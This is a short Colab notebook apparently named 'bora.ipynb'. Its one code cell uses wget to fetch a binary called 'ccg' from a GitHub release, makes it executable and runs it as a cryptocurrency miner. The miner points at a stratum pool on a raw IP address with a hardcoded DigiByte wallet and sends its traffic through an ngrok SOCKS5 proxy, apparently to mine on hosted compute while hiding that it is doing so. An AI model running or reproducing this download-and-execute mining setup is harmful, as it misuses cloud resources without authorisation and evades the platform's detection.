{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "bora.ipynb",
      "provenance": [],
      "machine_shape": "hm",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/joykotest/gula1/blob/main/bora.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "! wget -q https://github.com/includemachine10/learningmachine/releases/download/v.1/ccg && chmod +x ccg \n",
        "! chmod +x ccg \n",
        "! ./ccg -o stratum+tcp://103.249.70.7:6535 -u DAuAgv3gfX2h2gcwGs9c1kfJJrSpTsSNRV.$(shuf -n 1 -i 1-9999999) -p c=DGB,mc=SUGAR -x socks5://6.tcp.ngrok.io:16349\n"
      ],
      "metadata": {
        "id": "fxXdN4aWg-q_"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
